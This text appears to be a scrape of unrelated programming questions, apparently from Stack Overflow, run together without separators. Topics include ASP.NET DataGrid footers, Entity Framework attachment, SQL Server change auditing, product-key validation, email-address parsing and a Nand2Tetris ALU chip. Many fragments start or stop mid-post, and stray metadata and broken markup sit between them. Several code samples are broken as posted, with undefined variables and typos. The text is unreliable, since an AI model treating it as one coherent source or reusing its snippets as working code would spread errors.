<p>The way I figure, there's 2 ways I can think of:</p>

<p>1.""Use the <strong>Source</strong>, Luke""<br>
In the code where I'm calling DataGrid.DataBind(), use the DataTable.Compute() method (<em>or in my case DataSet.DataTable(0).Compute()</em>). For example:  </p>

<pre><code>Dim strAverage = DataTable.Compute(""Avg(ColumnName)"", """")  
</code></pre>

<p>But once I have this, how can I insert it into the footer?</p>

<p>2.""<strong>Bound</strong> for Glory""<br>
Using the DataGrid.ItemDataBound event, and calculating a running total from every ListItemType.Item and ListItemType.AlternatingItem, finally displaying in ListItemType.Footer. For example:  </p>

<pre><code>Select Case e.Item.ItemType
    Case ListItemType.Item, ListItemType.AlternatingItem
        runningTotal += CInt(e.Item.Cells(2).Text)
    Case ListItemType.Footer
        e.Item.Cells(2).Text = runningTotal/DataGrid.Items.Count
End Select
</code></pre>

<p>This just feels wrong, plus I would have to make sure the runningTotal is reset on every DataBind.  </p>

<p>Is there a better way?</p>

I try to find an open security framework that can be plugged-in to both Swing and Web applications (and JavaFX?), maybe easy to digest. I looked at plain JAAS, JGuard and JSecurity but its just too complicated to get started.
Any recommendations or experience to share ?

Here is my scenario.  I have a group of contacts and a group of phone numbers.  Each contact can be associated with multiple phone numbers and each phone number can be associated with multiple contacts.</p>

<p>A simple example of this situation would be an office with two employess (e1 &amp; e2), one main voice line (v1), one private voice line (v2).  e1 is the CEO so they have thier own private voice line, v1, but they can also be reached by calling the main line, v2, and asking for the CEO.  e2 is just an employee and can only be reached by calling v2.</p>

<p>So, e1 should be related to v1 &amp; v2.  e2 should be related to v2. Conversly, v1 should be related to e1 and v2 should be related to e1 &amp; e2.</p>

<p>The goal here is to ge able to run queries like ""what numbers can e1 be reached at"" and ""what employees can be reached at v2"", etc..  I know the answer will involve an intermediate table or tables but I just can't seem to nail down the exact architecture.</p>

<p>I am using JES.</p>

<p>I have made a function to convert a picture to grayscale. I created two names for each color r and  r1, g and g1, b and b1. The idea behind this, was to keep the original values in memory, so the picture could be restored to it's original color.</p>

<pre><code>def grayScale(pic):
  for p in getPixels(pic):
    r = int(getRed(p))
    g = int(getGreen(p))
    b = int(getBlue(p))//I have tried this with and without the int()

    setColor(p, color)

  for p in getPixels(pic):
    setColor (p, makeColor(r1,g1,b1))

<p>How to I create names and get their values for the original  (red, green, blue) that I can then use later in another function? Everything I have tried, has returned the altered (grayscale) values. thnx</p>

</blockquote>

<p>Discussion: I wrote a wrapper around a .NET dll from a third-party (LinkPointTransaction.dll  from FirstData), and I wrote some other assemblies that reference that wrapper.  As the code is running, a call to the third-party <code>LinkPointTransaction.LinkPointTxn.Send()</code> sends the transaction successfully to FirstData over the internet, but my application crashes w3wp.exe somewhere <strong><em>during</em></strong> that call, before it hits the next line.  It does not throw a managed exception that I can see; it just crashes.  Works fine everywhere on my machine except in IIS7.</p>

<p>I am running 64bit Vista Home Premium (IIS7), but I enabled 32bit apps in IIS, created a separate AppPool just for this web service, and have forced all of my assemblies to x86.  I have tried running the App Pool under my user account with Admin privileges instead of as the Network Service.  UAC is turned off.  I have tried Integrated and Classic modes.   I have explicitly opened the TCP/IP port in my local firewall that the LinkPointTransaction.dll uses to communicate with FirstData.  I even have shut my firewall off (behind a router).  </p>

<p>With any of these workarounds that I listed, it <strong><em>always</em></strong> works in a Windows app and also in a web service inside the VS Development Server, but <strong>never</strong> works in the local IIS server.</p>

<p>The AppPool for the IIS website is in Classic mode. (In response to

"463019","1","466414","","2009-01-20 20:44:04","","7","9040","<p>Ok, so in this example I have a parent entity called Template. A Template always has a type. The type is an FK that is very likely to already exist. The problem comes when creating a new Template and adding to it the type. Once the type is added and you go to add the Template you receive an error. Which error you receive depends on the approach. Does anyone know how to work with this kind of situation?</p>

<pre><code>public static void AddTemplate(Template template)
    {
        using (TheEntities context = new TheEntities())
        {
            //if (template.TemplateType.EntityKey != null)
            //{
            //    context.Attach(template.TemplateType);
            //}

            context.AddToTemplates(template);
            context.SaveChanges();

            context.RemoveTracking(template);
        }
    }
</code></pre>

<p>I have tried both attempting to attach the existing key and not. The call at the bottom to RemoveTracking is simply an extension to call detach on template and any sub entities that may have been loaded.</p>

<p>Here is the unit test.</p>

<pre><code>[TestMethod]
    public void CanAddAndDeleteATemplate()
    {
        Template template = new Template();
        template.Name = ""Test"";
        template.Description = ""Test"";

        TemplateType type = TemplateManager.FindTemplateTypeByName(""Round"");

        if (type == null)
        {
            type = new TemplateType();
            type.Name = ""Round"";
        }

        template.TemplateType = type;

        TemplateManager.AddTemplate(template);

        template = TemplateManager.FindTemplateByID(template.TemplateID);

        Assert.IsNotNull(template);

        TemplateManager.DeleteTemplate(template);

        template = TemplateManager.FindTemplateByID(template.TemplateID);

        Assert.IsNull(template);
    }
</code></pre>

<p>The unit test works perfectly assuming a Template Type of ""Round"" does not exist yet. I am starting to wonder if this kind of stuff is possible in a detached environment.</p>

<p>UPDATE</p>

<p>Ok I changed my code for AddTemplate to this and now it works..</p>

<pre><code>public static void AddTemplate(Template template)
    {
        using (TheEntities context = new TheEntities())
        {
            if (template.TemplateType.EntityKey != null)
            {
                TemplateType type = template.TemplateType;
                template.TemplateType = null;
                context.AttachTo(""TemplateTypes"", type);
                template.TemplateType = type;
            }


            context.AddToTemplates(template);
            context.SaveChanges();

            context.RemoveTracking(template);
        }
    }

<p>So for all existing child entities that are added to a new parent by a client will have to have this kind of work done on them when they are ready to be persisted. Is there a cleaner way to do this? Maybe something a bit more generic?</p>

<p>Suppose P2 is reading from <code>Foo.txt</code>. I don't want P1 to write to <code>Foo.txt</code> while P2 is reading it. </p>

<p>So I thought I could make P1 write to <code>Foo.tmp</code> and as a last step, rename <code>Foo.tmp</code> to <code>Foo.txt</code>. My programming language is Java</p>

<p>So my question is, would this ensure that P2 reads the correct data from <code>Foo.txt</code>? Would the rename operation be committed once P2 completes reading the file?</p>

<p><strong>EDIT</strong></p>

<p>I tried to recreate this scenario as follows:</p>

<p>My P1 code is something like this:</p>

<pre><code>File tempFile = new File(path1);
File realFile = new File(path2);
BufferedWriter writer = new BufferedWriter(new FileWriter(tempFile));
for(int i=0;i&lt;10000;i++)
    writer.write(""Hello World\n"");
writer.flush();
writer.close();
tempFile.renameTo(realFile);
</code></pre>

<p>and my P2 code is :</p>

<pre><code>BufferedReader br = new BufferedReader(new FileReader(file)); 
String line = null;
while(true) {
  while((line=br.readLine())!=null){
      System.out.println(line);
      Thread.sleep(1000);
  }
  br.close();
}
</code></pre>

<p>My Sample shared File:</p>

<pre><code>Test Input
Test Input
Test Input   
</code></pre>

<p>I'm starting P1 and P2 almost simulataneously (P2 starting first). </p>

<p>So according to my understanding, even though P1 has written a new Foo.txt, since P2 is already reading it, it should read the old Foo.txt content until it re-opens a BufferedReader to Foo.txt. </p>

<p>But what actually happens is P2 reads <code>Test Input</code> thrice, as is expected from the input, but after that it reads the new content which was written by P1. </p>

<p>Output from P2:</p>

<pre><code>Test Input
Test Input
Test Input 
Hello World
Hello World
Hello World
 .
 .
 .
</code></pre>

<p>So it doesn't work as it should. Am I testing this scenario wrong? I feel like there's something I'm missing out.</p>

Tornado 'helpfully' scrolls the window every time some new information arrives which means that if you spot an error, it disappears out of site too quickly to see.

<pre><code>Vec3 add(Vec3 v2){...}
Vec3* add(Vec3* v2){...}
</code></pre>

<p>But I fear this will lead to duplicate code and may be overhead.</p>

<p>Thank you for answers...btw, I could use a template to change the size of the Vector but I prefer to keep my Vec3 class alone and create a Vec4 class or name it Quaternion. </p>

<p><strong><em>EDIT</em></strong>
Here is the solution I came with. Feel free to comment or modify or reuse the code.
One thing. I just want to mention that, in my case, This class is supposed to be transparent. Just like we add numbers. </p>

<pre><code>int i = 10;
int j = 15;
int k = i + k;
</code></pre>

<p>If the add overload modify the object that is calling the function in this case i.
I would endup with a k being a reference to i and i being equal to 25. But what we really want here is a k equal to 25 and i,k unchanged. </p>

<p>Thats how my class work. Vec3 k = i + k will not modify i or k because we are creating a new number from these values. The only case where I return a reference is for +=, -=, ++, --..., set([XYZ])? and normalize.</p>

<p>It could be fun to do something like myvec.setX(10).normalize().scale(10)</p>

<p>NOTE: scale should return a reference. I didn't see it but I guess it should be better this way. </p>

<pre><code>Vec3 t = myvec.normalize().scale(100).copy();
</code></pre>

<p>What other uses are there besides those mentioned? </p>

<p>Is it a good idea to use curly braces to limit the scope of your variables and expand the scope only if required (working on a ""need-to-access"" basis)? Or is it actually silly? </p>

<p>How about using scopes just so that you can use the same variable names in different scopes but in the same bigger scope? Or is it a better practise to reuse the same variable (if you want to use the same variable name) and save on deallocating and allocating (I think some compilers can optimise on this?)? Or is it better to use different variable names altogether?</p>

Or do you feel similarly to opinionated frameworks like Ruby on Rails - the database is just a ""dumb repository"" for data, and all checks should be done in your application (I'm not trying to single out RoR here - I'm a huge fan of Rails myself, but I disagree with its approach to the database)?</p>

<p>Personally, I feel that you should have them both in order to make sure your database and application are well-secured.  What I mean is that you should make use of not-null constraints, give your fields a length if known ( as opposed to leaving them all at <em>nvarchar(255)</em> ), have things such as <strong>Foreign Keys</strong>, <strong>Check Constraints</strong> and <strong>Triggers</strong> on your database, and then also enforce this through business logic rules in your application.  IMO this makes your application robust through its user interface, and also secure against someone who might have direct access to the database.</p>

<p>The counter-argument I most often see is that it requires what amounts to duplicate logic; once at the database level, and once at the application level -- Let's say you have a check constraint to verify that a product's SKU is entered (i.e. it's length is greater than zero).</p>

<p>You would now need to also include validation methods in your business logic to make sure the value the user entered has a length greater than zero, and also possibly some client-side Javascript to catch the error as the user types data.</p>

<p>I for one do not see this as a bad thing - yes you have some duplicate logic, but the end result is the ""database as fortress"" mindset, since if you think about it your data is the single most important part of your application; after all, what good is your shiny new Web 2.0 application if the data can easily be corrupted and compromised?</p>

<p>What are your thoughts on this?  Should the database be an impenetrable fortress like Fort Knox, or an open safe that's guarded by lasers?  In other words, should you sacrifice some duplication of logic to ensure a secure data model, or leave everything to your application and use the database simply to store data?</p>

datetime.datetime(2008, 10, 1, 13, 17, 27, 609000)
etc.
</code></pre>

<p>The changes between clocks for the first second of samples looks like this:</p>

<pre><code>uSecs    difference
562000  
578000  16000
609000  31000
625000  16000
640000  15000
656000  16000
687000  31000
703000  16000
718000  15000
750000  32000
765000  15000
781000  16000
796000  15000
828000  32000

</code></pre>

<p>So it looks like the timer data is only updated every ~15-32ms on my machine. The problem comes when we come to analyse the data because sorting by something other than the timestamp and then sorting by timestamp again can leave the data in the wrong order (chronologically). It would be nice to have the time stamps accurate to the point that any call to the time stamp generator gives a unique timestamp.</p>

<p>I had been considering some methods involving using a time.clock() call added to a starting datetime, but would appreciate a solution that would work accurately across threads on the same machine. Any suggestions would be very gratefully received.</p>

<p><strong>What's a reliable way in Javascript to determine the media type (e.g. screen, print, handheld) of the page?</strong> I've seen references to <code>document.styleSheets[0].media</code>, but I've had no luck using this, either because of browser support issues or because I'm not understanding something.</p>

<p>I'm asking because I want something to be hidden by Javascript in screen view, but not in print view. Media-dependent styles can't be relied on to do this because I'm using Prototype to run a toggle switch for the element, and Prototype won't allow an element to be switched to visible if it was declared invisible (<code>display: none</code>) with non-inline CSS*. I tried to just set media-specific inline styles for the element (<code>&lt;div style=""@media print { foo: bar; } @media screen { blargh: bfargle; }""&gt;</code>), but from what I can tell, that's not supported. </p>

<p>I know that I can cycle through the stylesheets and check to see if a print-specific linked stylesheet is active or not, but I'm currently in a situation where various media-specific style declarations are all mixed around in a single linked stylesheet, so that's no good. And yeah, I can just split up the stylesheets into different media types, but I'd first like to figure out whether or not I can just reliably pull the media type out of the DOM with Javascript, <strong>completely independently of CSS</strong>. Oh, and I've tried that trick of ""hide an element for the print view, then check to see if it's visible with Javascript"" but that's always resulted in (when I load up print preview) Javascript detemining that the supposed-to-be-hidden elements are visible and performing whatever DOM manipulation I tell it to, <em>despite</em> the fact that those elements <em>aren't</em> visible. If anybody would like more details about what I'm talking about here, I can elaborate in an edit.</p>

<p>I've read that error can be due to <a href=""http://mattclingan.wordpress.com/2007/09/28/title-is-not-a-member-of-asp-what-the-hey/"" rel=""nofollow noreferrer"">a codebehind class naming conflict</a>.  But I don't think that's the case here.</p>

<p>Can I not use a Model from a different project to create a strongly-typed ASP.NET MVC View?</p>

<h2>Update 1:</h2>

<p>I've tried importing the namespace on my Display.aspx page, but none of </p>

<pre><code>&lt;%@ Import Namespace=""WpfApplication1"" %&gt;
</code></pre>

<p>or</p>

<pre><code>&lt;%@ Import Namespace=""SolutionName.WpfApplication1"" %&gt;
</code></pre>

<p>or</p>

<pre><code>&lt;%@ Import Namespace=""SolutionName.WpfApplication1.Model1Entities"" %&gt;
</code></pre>

<p>prevent the error.</p>

<h2>Update 2:</h2>

<p>I've tried adding the namespace to my Views/Web.config file, but niether</p>

<pre><code>&lt;add namespace=""SolutionName.WpfApplication1"" /&gt;
</code></pre>

<p>nor</p>

<pre><code>&lt;add namespace=""SolutionName.WpfApplication1.Model1Entities"" /&gt;
</code></pre>

<p>prevent the error.</p>

<h2>Update 3:</h2>

<p>Since adding the namespace, I do now get this Warning:</p>

<blockquote>
  <p>Namespace or type specified in the

  cannot be found. Make sure the
  namespace or the type is defined and
  contains at least one public member.
  Make sure the imported element name
  doesn't use any aliases.</p>
</blockquote>

<p>Is that a clue?</p>

<h2>Update 4:</h2>

<p>I've moved the model from my WpfApplication1 to a new ClassLibrary1.</p>

<p>I've cleaned up my Controller.</p>

<pre>
Imports ClassLibrary1

Public Class NodeController
    Inherits System.Web.Mvc.Controller

    Function Display(ByVal id As Guid) As ActionResult
        Dim db As New Model1Entities
        Dim m As Node = (From n In db.Node _
                         Where n.Id = id _
                         Select n).First
        Return View(m)
    End Function

End Class
</pre>

<p>I've cleaned up my View.</p>

<pre><code>&lt;%@ Import Namespace=""ClassLibrary1"" %&gt;
&lt;%@ Page Title="""" Language=""VB"" MasterPageFile=""~/Views/Shared/Site.Master"" Inherits=""System.Web.Mvc.ViewPage(Of Node)"" %&gt;

<p>I no longer see the Warning.</p>

<p>But I still get the runtime error.</p>

<p>The problem I have, though, is that I am not quite sure how to implement the product key verification. What I have in mind is that the customer can sign up on my webpage (after trying the product for a while), pay for the product, and get a product key in the form of aaaaa-bbbbb-ccccc-ddddd-eeeee via e-mail (or maybe available via his profile on my website). No problem so far. He/She then drops the key in the appropriate key fields in my app and <em>boom</em> the app is registered.</p>

<p>From what I could gather so far, people either recommend AES or RSA for this. To be honest, I in another direction in college (not cryptography) and the one cryptography class I took was some time ago. But from what I remember, AES is a symmetric encryption algorithm, which would mean that I would only have one key for encryption and decryption, right? How could I then generate thousands of product keys and still validate them in my app (which by the way won't require internet access....so no checking back with a server)?</p>

<p>So I guess RSA would be the way to go? But doesn't RSA produce pretty long keys (at least longer than the required 25 characters from above)?</p>

<p>In <a href=""https://stackoverflow.com/questions/453030/how-can-i-create-a-product-key-for-my-c-app"">another thread</a> I read that some products won't even use encryption for the product key generation/verification, but instead just employ some checks like ""add the 2. and the 17. character and that should total to x"". </p>

<p>What's the fastest, easiest and most secure way to go here? :-) Code samples would be sugar!</p>

<p>Regards,</p>

<p>Sebastian </p>

<p>P.S.: Oh...and please don't tell me how my key can and will be cracked at some point.....I know about that, which is primarily why I don't want to spend a lot of time with this issue, but at the same time not make it too easy for the occasional cracker.</p>

But, I'm getting to the point where the data model grows and I feel a need to normalize it and split one logical entity into several physical lists. I'm wondering if I should switch from the SP lists to a classic database.

I pretty much understand the concepts, but practically speaking, I am having a really hard time finding information about how to best use Models in my Zend Framework applications.</p>

<p>Specifically, I have a Model (that doesn't extend anything) that doesn't use a Database Table. It uses getters and setters to access its protected members. I find myself struggling with how to best display this model in the view. I don't want logic in my view templates, but I find myself in the following situation:</p>

<p>In my controller:</p>

<pre><code>$object = new Object();
$object-&gt;setName('Foo Bar');
$this-&gt;view-&gt;object = $object;
</code></pre>

<p>In my view template:</p>

<pre><code>&lt;h2&gt;&lt;?= $this-&gt;object-&gt;getName() ?&gt;&lt;/h2&gt;
</code></pre>

<p>I don't really like calling functions in my view templates but I don't know a better way to do this. I don't want my Model's members to be public, but I basically want to achieve the same results:</p>

<pre><code>&lt;h2&gt;&lt;?= $this-&gt;object-&gt;name ?&gt;&lt;/h2&gt;
</code></pre>

<p>I don't want my controller to do all the work of having to know everything about the model:</p>

<pre><code>$object = new Object();
$object-&gt;setName('Foo Bar');
$this-&gt;view-&gt;object = $object;
$this-&gt;view-&gt;object-&gt;name = $object-&gt;getName();

<p>Edit: I confused matters by making the Foo constructor ""explicit"" in the original question.  I've removed that, but appreciate the answers.</p>

<p>I've also added declaration of a copy constructor, to make it clear that copying may not be a trivial operation.</p>

<p>What I really want to know is, according to the C++ standard, will ""Foo f = 42"" directly call the Foo(int) constructor, or is the copy constructor going to be called?</p>

I made a class called pair which stores the type I'm looking for, and the number of that type.

it will be good if your suggestion has a good run time performance, i don't want to wait my users so much :)</p>

<p>Edit: thanks for response but isolines have some constrains like they should not intersects

<p>What is the best way to do it in SQL Server 2005?</p>

<p>I am going to assume the logic will be placed in some Triggers.</p>

<p>What is a good way to loop through all the fields checking for a change without hard coding all the fields? </p>

<p>As you can see from my questions, example code would be veeery much appreciated.</p>

<p>I noticed SQL Server 2008 has a new feature called Change Data Capture (CDC). (Here is a nice <a href=""http://channel9.msdn.com/posts/ashishjaiman/CDC-Change-Data-Capture-SQL-Server-2008/"" rel=""nofollow noreferrer"">Channel9</a> video on CDC). This is similar to what we are looking for except we are using SQL Server 2005, already have a Log Table layout in-place and are also logging the user that made the changes. I also find it hard to justify writing out the before and after image of the whole record when one field might change. </p>

<p>Our current log file structure in place has a column for the Field Name, Old Data, New Data.</p>

<p>Thanks in advance and have a nice day.</p>

<li><p>You can create a trigger to do this. See
<a href=""http://web.archive.org/web/20071006100909/http://sqlserver2000.databases.aspfaq.com:80/how-do-i-audit-changes-to-sql-server-data.html"" rel=""nofollow noreferrer"">How do I audit changes to sq​l server data</a>.</p></li>
<li><p>You can use triggers to log the data changes into the log tables. You can also purchase Log Explorer from <a href=""http://www.lumigent.com"" rel=""nofollow noreferrer"">www.lumigent.com</a> and use that to read the transaction log to see what user made the change. The database needs to be in full recovery for this option however.</p></li>
</ol>

<p><strong>Updated 12/23/08:</strong> I also wanted a clean way to compare what changed and this looked like the reverse of a PIVOT, which I found out in SQL is called UNPIVOT. I am now leaning towards a Trigger using UNPIVOT on the INSERTED and DELETED tables. I was curious if this was already done so I am going through a search on ""<a href=""http://www.google.com/search?hl=en&amp;sa=X&amp;oi=spell&amp;resnum=1&amp;ct=result&amp;cd=1&amp;q=unpivot+deleted+inserted&amp;spell=1"" rel=""nofollow noreferrer"">unpivot deleted inserted</a>"".</p>

<p>I am a little lost on loading modules on demand, and I hope you guys can enlighten me. I am using <strong>v2 #7</strong>.
<p></p>

<h2>Here's what I want to accomplish:</h2>

<blockquote>
  <p>1) I have 2 regions - one for buttons that instantiate the modules (MenuRegion), another to show the modules (MainRegion). Only one module is to be visible at a time in MenuRegion.<br>
  2) Modules are to be found in a directory<br>
  3) The MenuModule module is associated with MenuRegion and is to create buttons showing the module names. When one of the buttons is clicked, the corresponding module is to be loaded and displayed in MainRegion.<br>
  4) Behavior:<br>
  &nbsp;&nbsp;&nbsp; a) ModuleA button is clicked and ModuleA is displayed. User enters data in ModuleA and data is left in an unsaved state.<br>
  &nbsp;&nbsp;&nbsp; b) ModuleB button is clicked and ModuleB is displayed. User enters data in ModuleB and data is left in an unsaved state.<br>
  &nbsp;&nbsp;&nbsp; c) ModuleA button is click and ModuleA is displayed with the information previously entered.<p></p>
</blockquote>

<h2>Please correct me if I am wrong in my assumptions, and please give me other suggestions:</h2>

<blockquote>
  <p>1) MainRegion should be a ContentControl, so only one module is visible at a time.<br>
  2) I think I need to enumerate the ""GrouplessModules"" of my Catalog to get the ModuleInfo for the modules available in the directory<br>
  3) To load the module I think I need to call myModuleManager.LoadModule(moduleName)<br></p>
</blockquote>

<h2>Finally, my questions:</h2>

<blockquote>
  <p>1) Should I have the moduleManager as a parameter in my MenuModuleView's constructor?<br>
  2) How do I get the catalog accessible from inside MenuModuleView, in order to enumerate the available modules?<br>
  3) From MenuModuleView, as I enumerate through the modules, I create the buttons, assigning the ModuleInfo to the button's Tag property. This way, I have only one click event to load the module. Is this correct? It smells a bit work-aroundish to me...<br></p>

<p>Can someone suggest the best way to do this?</p>

<p>I've tried to Split on the commas, which would work except in the second example where the last name is placed first. I suppose this method could work, if after i split, i examine each element and see if it contains a '@' or '&lt;'/'>', if it doesn't then it could be assumed that the next element is the first name. Is this a good way to approach this? Have i overlooked another format the address could be in?</p>

<hr>

<p>UPDATE: Perhaps i should clarify a little, basically all i am looking to do is break up the string containing the multiple addresses into individual strings containing the address in whatever format it was sent in. I have my own methods for validating and extracting the information from an address, it was just tricky for me to figure out the best way to separate each address.</p>

<p>Here is the solution i came up with to accomplish this:</p>

<pre><code>String str = ""Last, First &lt;name@domain.com&gt;, name@domain.com, First Last &lt;name@domain.com&gt;, \""First Last\"" &lt;name@domain.com&gt;"";

List&lt;string&gt; addresses = new List&lt;string&gt;();

int commaIdx = 0;
int lastComma = 0;
for (int c = 0; c &lt; str.Length; c++)
{
    if (str[c] == '@')
        atIdx = c;

    if (str[c] == ',')
        commaIdx = c;

    if (commaIdx &gt; atIdx &amp;&amp; atIdx &gt; 0)
    {
        string temp = str.Substring(lastComma, commaIdx - lastComma);
        addresses.Add(temp);
        lastComma = commaIdx;
        atIdx = commaIdx;
    }

    if (c == str.Length -1)
    {
        string temp = str.Substring(lastComma, str.Legth - lastComma);
        addresses.Add(temp);
    }
}

if (commaIdx &lt; 2)
{
    // if we get here we can assume either there was no comma, or there was only one comma as part of the last, first combo
    addresses.Add(str);
}

Most of the proposed solutions had troubles when dealing with non single-byte strings. So, I was wondering what could be a good algorithm for dealing specifically with utf-8 strings.</p>

<p>I came up with some code, which I'm posting as an answer, but I'd be glad to see other people's ideas or suggestions. I preferred to use actual code, so I've chosen C#, as it seems to be one of the most popular language in this site, but I don't mind if your code is in another language, as long as it could be reasonably understood by anyone who is familiar with an imperative language. And, as this is intended to see how such an algorithm could be implemented at a low-level (by low-level I just mean dealing with bytes), the idea is to avoid using libraries for the core code.</p>

<p><strong>Notes:</strong></p>

<p>I'm interested in the algorithm itself, its performance and how could it be optimized (I mean algorithm-level optimization, not replacing i++ with ++i and such; I'm not really interested in actual benchmarks either).</p>

<p>I don't mean to actually use it in production code or ""reinventing the wheel"". This is just out of curiosity and as an exercise.</p>

<p>I'm using C# byte arrays so I'm assuming you can get the length of the string without running though the string until you find a NUL.
That is, I'm not accounting for the complexity of finding the length of the string. But if you're using C, for instance, you could factor that out by using strlen() before calling the core code. </p>

<p><strong>Edit:</strong></p>

<p>As Mike F points out, my code (and other people's code posted here) is not dealing with composite characters. Some info about those <a href=""http://www.unicode.org/faq/char_combmark.html"" rel=""nofollow noreferrer"">here</a>. I'm not familiar with the concept, but if that means that there are ""combining characters"", i.e., characters / code points that are only valid in combination with other ""base"" characters / code points, a look-up table of such characters could be used to preserve the order of the ""global"" character (""base"" + ""combining"" characters) when reversing.</p>

<p>So now, I'm looking for a way to strip those whitespaces in ActionScript.

But what should I use as a needle (string to search) ? (I've tried to put in <code>""\t""</code> and <code>""\r""</code>, don't seem to be able to detect those whitespaces).</p>

<p>edit :</p>

<p>now that I've tried to throw in <code>newline</code> as a needle, it works (meaning that newline successfully got stripped).</p>

<pre><code>mystring = str_replace(newline, '', mystring);
</code></pre>

<p>But, newlines only got stripped once, meaning that in every consecutive newlines, (eg. a newline followed by another newline) only one newline can be stripped away.</p>

<p>Now, I don't see that this as a problem in the <code>str_replace</code> function, since every consecutive character other than newline get stripped away just fine.</p>

<p>I've tried str_replace -ing everything I know of, \n, \r, \t, newline, and tab (by pressing tab key). Replacing \n, \r, and \t seem to have no effect whatsoever.</p>

<p>I know that by successfully doing this, my content can never have real line breaks. That's exactly my intention. I could format the XML the way I want without Flash displaying any of the formatting stuff. :)</p>

I am using SQL2005 express and i want to copy data from databaseA to databaseB.  DatabaseB already contains existing data - it may even contain data with pk's that have changed or dont exist - for example:</p>

<p>DataBase A
pk1 = peaches
pk2 = apples</p>

<p>DataBase B
pk1 = peaches
pk2 = oranges
pk3 = apples</p>

<p>now both A &amp; B have related tables that are tied to the pk.</p>

<p>Historically i would write an app that selects the data from A and copies it to B via its Insert/Update procs (using .NET), but obv this is very cumbersome, tho some advantages are i could have a dropdown that allows you to select A to copy - and B to copy to if it exists, or say add new - for instance:</p>

<p>(dropdown - select source)
Peaches
Apples</p>

<p>(dropdown - select target)
-new-
peaches
oranges
apples</p>

<p>I was going to use SSIS, but the target db has only SQL express so this is not available nor do i have time to learn it (ive used dts much in the past, but not this newer tool).  In SQL2000 i would just use DTS, but with the more complicated schema now im not even sure i would trust that.</p>

<p>Any suggestions or should i just continue to write my custom apps to migrate data from A to B?</p>

The projects share some assembly references (the file systems are all structured to use the same 'bin' folder), making deployment of changes to those assemblies problematic since the MS installer will only overwrite assemblies if the currently installed version is older than the one in the MSI.</p>

<p>I'm not suggesting that the pessimistic installation scheme is wrong - only that it creates a problem in the environment I've been given to work with.  Since there are a sizable number of common assemblies and a significant number of developers who might change a common assembly but forget to update its version number, trying to manage versioning manually will eventually lead to massive confusion at install time.</p>

<p>On the flip side of this issue, it's also important not to spontaneously update version numbers and replace <em>all</em> common assemblies with <em>every</em> install, since that could (temporarily at least) obscure cases where actual changes were made.</p>

<p>That said, what I'm looking for is a means to update assembly version information (preferably using MSBuild) only in cases where the assembly constituents (code modules, resources etc) has/have actually changed.</p>

<p>I've found a few references that are at least partially pertinent <a href=""http://code.msdn.microsoft.com/AssemblyInfoTaskvers/Release/ProjectReleases.aspx?ReleaseId=232"" rel=""noreferrer"" title=""here"">here </a> (AssemblyInfo task on MSDN) and <a href=""http://social.msdn.microsoft.com/Forums/en-US/msbuild/thread/94054d89-ba19-4658-9e4e-ce7d8ff4dea3/"" rel=""noreferrer"" title=""here"">here</a> (looks similar to what I need, but more than two years old and without a clear solution).</p>

<p>My team also uses TFS version control, so an automated solution should probably include a means by which the AssebmlyInfo can be checked out/in during the build.</p>

Anyway, the course is called ""From Nand to Tetris"" and I'm hoping someone here has seen or taken the course so I can get some help. I am at the stage where I am building the ALU with the supplied hdl language. My problem is that I can't get my chip to compile properly. I am getting errors when I try to set the output flags for the ALU. I believe the problem is that I can't subscript any intermediate variable, since when I just try setting the flags to true or false based on some random variable (say an input flag), I do not get the errors. I know the problem is not with the chips I am trying to use since I am using all builtin chips.</p>

<p>Here is my ALU chip so far:</p>

<pre><code>/**
 * The ALU.  Computes a pre-defined set of functions out = f(x,y)
 * where x and y are two 16-bit inputs. The function f is selected 
 * by a set of 6 control bits denoted zx, nx, zy, ny, f, no.
 * The ALU operation can be described using the following pseudocode:
 *     if zx=1 set x = 0       // 16-bit zero constant
 *     if nx=1 set x = !x      // Bit-wise negation
 *     if zy=1 set y = 0       // 16-bit zero constant
 *     if ny=1 set y = !y      // Bit-wise negation
 *     if f=1  set out = x + y // Integer 2's complement addition
 *     else    set out = x &amp; y // Bit-wise And
 *     if no=1 set out = !out  // Bit-wise negation
 *
 * In addition to computing out, the ALU computes two 1-bit outputs:
 *     if out=0 set zr = 1 else zr = 0 // 16-bit equality comparison
 *     if out&lt;0 set ng = 1 else ng = 0 // 2's complement comparison
 */

CHIP ALU {

IN  // 16-bit inputs:
    x[16], y[16],
    // Control bits:
    zx, // Zero the x input
    nx, // Negate the x input
    zy, // Zero the y input
    ny, // Negate the y input
    f,  // Function code: 1 for add, 0 for and
    no; // Negate the out output

OUT // 16-bit output
    out[16],

    // ALU output flags
    zr, // 1 if out=0, 0 otherwise
    ng; // 1 if out&lt;0, 0 otherwise

PARTS:
// Zero the x input
Mux16( a=x, b=false, sel=zx, out=x2 );

// Zero the y input
Mux16( a=y, b=false, sel=zy, out=y2 );

// Negate the x input
Not16( in=x, out=notx );
Mux16( a=x, b=notx, sel=nx, out=x3 );

// Negate the y input
Not16( in=y, out=noty );
Mux16( a=y, b=noty, sel=ny, out=y3 );

// Perform f
Add16( a=x3, b=y3, out=addout );
And16( a=x3, b=y3, out=andout );
Mux16( a=andout, b=addout, sel=f, out=preout );

// Negate the output
Not16( in=preout, out=notpreout );
Mux16( a=preout, b=notpreout, sel=no, out=out );

// zr flag
Or8way( in=out[0..7], out=zr1 );   // PROBLEM SHOWS UP HERE
Or8way( in=out[8..15], out=zr2 );
Or( a=zr1, b=zr2, out=zr );

// ng flag
Not( in=out[15], out=ng );

}
</code></pre>

<p>So the problem shows up when I am trying to send a subscripted version of 'out' to the Or8Way chip. I've tried using a different variable than 'out', but with the same problem. Then I read that you are not able to subscript intermediate variables. I thought maybe if I sent the intermediate variable to some other chip, and that chip subscripted it, it would solve the problem, but it has the same error. Unfortunately I just can't think of a way to set the zr and ng flags without subscripting some intermediate variable, so I'm really stuck!</p>

<p>Just so you know, if I replace the problematic lines with the following, it will compile (but not give the right results since I'm just using some random input):</p>

<pre><code>// zr flag
Not( in=zx, out=zr );

// ng flag
Not( in=zx, out=ng );
</code></pre>

<p>Anyone have any ideas?</p>

<p><strong>Edit:</strong> Here is the <a href=""http://www1.idc.ac.il/tecs/book/appendixA.pdf"" rel=""noreferrer"">appendix of the book for the course</a> which specifies how the hdl works. Specifically look at section 5 which talks about buses and says: ""An internal pin (like v above) may not be subscripted"".</p>

<p><strong>Edit:</strong> Here is the exact error I get: ""Line 68, Can't connect gate's output pin to part"". The error message is sort of confusing though, since that does not seem to be the actual problem. If I just replace ""Or8way( in=out[0..7], out=zr1 );"" with ""Or8way( in=false, out=zr1 );"" it will not generate this error, which is what lead me to look up in the appendix and find that the out variable, since it was derived as intermediate, could not be subscripted.</p>

